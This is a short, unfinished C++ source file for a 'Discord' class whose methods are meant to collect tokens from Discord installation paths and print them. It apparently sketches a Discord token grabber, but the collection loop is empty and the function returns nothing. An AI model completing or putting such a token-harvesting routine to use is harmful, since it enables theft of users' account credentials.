//
// Created by .1qxz on 07.06.2024.
//

#include "Discord.h"

void Discord::execute(fs::path &root) {
    for(const std::string& token : this->getTokens())
    {
        std::cout << token;
    }
}

std::vector<std::string> Discord::getTokens() {
    for(const fs::path& path : this->discord_paths)
    {

    }
}
